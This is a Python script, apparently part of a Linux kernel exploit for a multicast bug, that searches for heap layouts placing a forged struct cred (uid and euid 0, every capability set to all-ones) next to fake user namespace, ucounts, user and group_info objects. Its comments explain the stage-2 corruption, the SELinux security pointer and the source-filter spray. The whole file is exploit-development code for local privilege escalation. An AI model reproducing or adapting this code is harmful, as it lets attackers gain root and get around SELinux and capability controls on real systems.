# lay12.py -- layout solver for the mcast port, stage-2 corrected.
#
# Differences vs lay11 (all forced by the mcast object geometry):
#
#   * The cred phase is PINNED to 0x18.  Stage 1 hands the collect a fake
#     timerqueue_head at C - 0x10, so that head+0x00 (rb_root.rb_node) and
#     head+0x08 (rb_leftmost) land in the psl *header* of the cred's block
#     (rcu.next / rcu.func), which our rewrite can never touch and which the
#     erase only *reads* in the fixup (rb_leftmost != X).  With any other
#     phase C-0x10 would overlap our own source bytes and the erase could
#     rewrite them.
#
#   * There is no 'sec' object any more: the SELinux task_security_struct has
#     to live in block O (the only block we can address by ordinal), at a
#     residue the node's stage patterns leave alone.  The cred->security
#     value is therefore a fixed address supplied by the caller
#     (sec_addr = base + 0x100*oi + sec_residue), identical in every psl copy.
#
#   * cred->usage|uid is still one 8-byte ('self') store = C, so usage is the
#     low half and uid the high half of C; euid (0x14) is 0 and egid|fsuid
#     (0x18) is the huge u64 the second collect iteration decodes as expires.
import random

WLO, WHI = 0x18, 0xf8
NBLK = 32
SLAB = 0x2000

CRED = [
    (0x00, 8, ('self',)),            # usage = low32(C), uid = high32(C)
    (0x08, 8, None),                 # gid|suid: clobbered by the stage-2 erase
    (0x10, 4, None),                 # sgid (u64 at C+0x10 = sgid|euid)
    (0x14, 4, 0),                    # euid 0
    (0x18, 4, 0),                    # egid 0
    (0x1c, 4, 0xffffffff),           # fsuid -1 (iteration-2 expires hi word)
    (0x20, 8, 0),                    # fsgid|securebits
    (0x28, 8, 0xffffffffffffffff),   # cap_inheritable
    (0x30, 8, 0xffffffffffffffff),   # cap_permitted
    (0x38, 8, 0xffffffffffffffff),   # cap_effective
    (0x40, 8, 0xffffffffffffffff),   # cap_bset
    (0x48, 8, 0),                    # cap_ambient
    (0x50, 8, 0),                    # jit_keyring + pad
    (0x58, 8, ('addr', 'user')),     # session_keyring (refcount at +0)
    (0x60, 8, ('addr', 'gi')),       # process_keyring
    (0x68, 8, 0),                    # thread_keyring = NULL (required)
    (0x70, 8, ('addr', 'user')),     # request_key_auth
    (0x78, 8, ('fixed',)),           # security = sec_addr (block O)
    (0x80, 8, ('addr', 'user')),     # user
    (0x88, 8, ('addr', 'ns')),       # user_ns
    (0x90, 8, ('addr', 'ucounts')),  # ucounts
    (0x98, 8, ('addr', 'gi')),       # group_info
]
NS = [
    # uid_map: one extent {first=0, lower_first=0, count=0}.  count 0 wraps
    # "last" to 0xffffffff, so the map is the identity and getuid() returns
    # cred->uid (the high half of C) instead of from_kuid_munged()'s
    # overflowuid.  The winner's "did my cred land" test is exactly
    # getuid() == high32(C), so without this every fake cred reads 65534.
    (0x00, 4, 1),                    # uid_map.nr_extents = 1
    (0x10, 8, 0),                    # extent count / aliases ns.ucounts (0x210)
    (0x48, 4, 0),                    # gid_map.nr_extents = 0
    (0xe0, 4, 0),                    # level = 0 (-> EPERM, no parent walk)
    (0x104, 4, 0x40000000),          # ns.count
    (0x210, 8, 0),                   # ns.ucounts = NULL ends inc_rlimit walk
]
UC = [
    (0x10, 8, ('addr', 'ns')),       # ucounts.ns
    (0x18, 4, ('hi32', 'cred')),     # ucounts.uid
    (0x1c, 4, 0x40000000),           # ucounts.count
    (0x70, 8, 0),                    # rlimit[RLIMIT_NPROC] = 0
]
USER = [(0x00, 4, 0x40000000)]
GI = [(0x00, 4, 0x40000000), (0x04, 4, 0)]
SPAN = {'cred': 0xb0, 'ns': 0x270, 'ucounts': 0x78, 'user': 0x04, 'gi': 0x08}
OBJS = {'cred': CRED, 'ns': NS, 'ucounts': UC, 'user': USER, 'gi': GI}
OTHERS = ['ns', 'ucounts', 'user', 'gi']
CRED_PHASE = 0x18


class Fail(Exception):
    pass


class State:
    __slots__ = ('mem', 'demands', 'addr', 'base', 'forbid', 'sec_addr')

    def __init__(self, base, forbid, sec_addr):
        self.mem = {}
        self.demands = []
        self.addr = {}
        self.base = base
        self.forbid = forbid
        self.sec_addr = sec_addr

    def copy(self):
        s = State(self.base, self.forbid, self.sec_addr)
        s.mem = dict(self.mem)
        s.demands = list(self.demands)
        s.addr = dict(self.addr)
        return s

    def place(self, obj, A):
        if A & 7:
            return None
        d = A - self.base
        if d < 0 or d + SPAN[obj] > SLAB:
            return None
        if (d >> 8) in self.forbid:
            return None
        used = set()
        for (off, size, spec) in OBJS[obj]:
            for i in range(size):
                used.add(d + off + i)
        if any((u >> 8) in self.forbid for u in used):
            return None
        s = self.copy()
        adds = {}

        def commit(r, v):
            if r < WLO or r >= WHI:
                raise Fail('residue %#x outside window' % r)
            if r in s.mem:
                if s.mem[r] != v:
                    raise Fail('conflict at %#x' % r)
                return
            if r in adds and adds[r] != v:
                raise Fail('self-conflict at %#x' % r)
            adds[r] = v

        def val_of(spec):
            if isinstance(spec, int):
                return spec
            kind = spec[0]
            if kind == 'self':
                return A
            if kind == 'fixed':
                return s.sec_addr
            target = spec[1]
            if target in s.addr:
                B = s.addr[target]
                if kind == 'addr':
                    return B
                if kind == 'low32':
                    return B & 0xffffffff
                if kind == 'hi32':
                    return (B >> 32) & 0xffffffff
            return None

        try:
            for (off, size, spec) in OBJS[obj]:
                if spec is None:
                    continue
                v = val_of(spec)
                for i in range(size):
                    r = (A + off + i) & 0xff
                    if v is not None:
                        commit(r, (v >> (8 * i)) & 0xff)
                    else:
                        if r < WLO or r >= WHI:
                            raise Fail('demand residue %#x' % r)
                        s.demands.append((r, spec[1], spec[0], i))
            keep = []
            for (r, target, kind, bi) in s.demands:
                if target != obj:
                    keep.append((r, target, kind, bi))
                    continue
                if kind == 'addr':
                    v = A
                elif kind == 'low32':
                    v = A & 0xffffffff
                else:
                    v = (A >> 32) & 0xffffffff
                commit(r, (v >> (8 * bi)) & 0xff)
            s.demands = keep
        except Fail:
            return None
        s.mem.update(adds)
        s.addr[obj] = A
        return s


def chunks_of(mem):
    return [bytes(mem.get(WLO + 16 * k + i, 0) for i in range(16))
            for k in range(14)]


FILLER = 0x11


def fill_chunks(mem):
    """BLOCK/UNBLOCK_SOURCE reject duplicate sources, so the 14 chunks must be
    pairwise distinct (and no all-zero chunk: the spray starts from 14 zero
    sources and the delete-all loop relies on a unique tail value)."""
    mem = dict(mem)
    seen = set()

    def paint(k, tag):
        for i in range(16):
            r = WLO + 16 * k + i
            if r not in mem:
                mem[r] = (tag + k) & 0xff or 1
                return True
        return False

    for k in range(14):
        ch = bytes(mem.get(WLO + 16 * k + i, 0) for i in range(16))
        if ch == bytes(16) or ch in seen:
            if not paint(k, FILLER):
                return None
            ch = bytes(mem.get(WLO + 16 * k + i, 0) for i in range(16))
        seen.add(ch)
    return mem


def feasible(state, obj, rnd=None):
    out = []
    for b in range(NBLK):
        if b in state.forbid:
            continue
        for p in range(0x00, 0x100, 8):
            s = state.place(obj, state.base + 0x100 * b + p)
            if s is not None:
                out.append((b, p))
    if rnd:
        rnd.shuffle(out)
    return out


def dfs(state, todo, rnd, budget):
    if not todo:
        return state
    best = None
    cand = None
    for obj in todo:
        fs = feasible(state, obj)
        if not fs:
            return None
        if cand is None or len(fs) < len(cand):
            best, cand = obj, fs
    rnd.shuffle(cand)
    for (b, p) in cand[:64]:
        budget[0] -= 1
        if budget[0] < 0:
            return None
        s2 = state.place(best, state.base + 0x100 * b + p)
        if s2 is None:
            continue
        r = dfs(s2, [o for o in todo if o != best], rnd, budget)
        if r is not None:
            return r
    return None


def solve(base, oi, sec_res, seed=1, budget=400000):
    """sec_res: residue inside block oi where the SELinux tsec lives."""
    sec_addr = base + 0x100 * oi + sec_res
    for bC in range(NBLK):
        if bC == oi:
            continue
        C = base + 0x100 * bC + CRED_PHASE
        s = State(base, {oi}, sec_addr).place('cred', C)
        if s is None:
            continue
        s.forbid = {oi, bC}
        rnd = random.Random(seed ^ (bC << 8))
        got = dfs(s, list(OTHERS), rnd, [budget])
        if got is None:
            continue
        mem = fill_chunks(got.mem)
        if mem is None:
            continue
        got.mem = mem
        ch = chunks_of(got.mem)
        if len(set(ch)) != 14 or bytes(16) in ch:
            continue
        return got, (bC, CRED_PHASE)
    return None, None


def dump(st, tag):
    print(tag)
    for o in ['cred'] + OTHERS:
        A = st.addr[o]
        print('  %-8s %#018x  block %2d phase %#04x' %
              (o, A, (A - st.base) >> 8, A & 0xff))
    print('  unresolved demands:', st.demands[:5], len(st.demands))
    print('  chunks distinct:', len(set(chunks_of(st.mem))) == 14)


def main():
    import sys
    base = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0xffffff80036d2000
    oi = int(sys.argv[2], 0) if len(sys.argv) > 2 else 11
    sec_res = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0xe8
    st, info = solve(base, oi, sec_res)
    if st is None:
        print('NO LAYOUT base=%#x oi=%d sec=%#x' % (base, oi, sec_res))
        return 1
    dump(st, 'LAYOUT base=%#x oi=%d cred=(%d,%#x) sec=%#x'
         % (base, oi, info[0], info[1], base + 0x100 * oi + sec_res))
    for i, c in enumerate(chunks_of(st.mem)):
        print('   [%2d] %s' % (i, c.hex()))
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
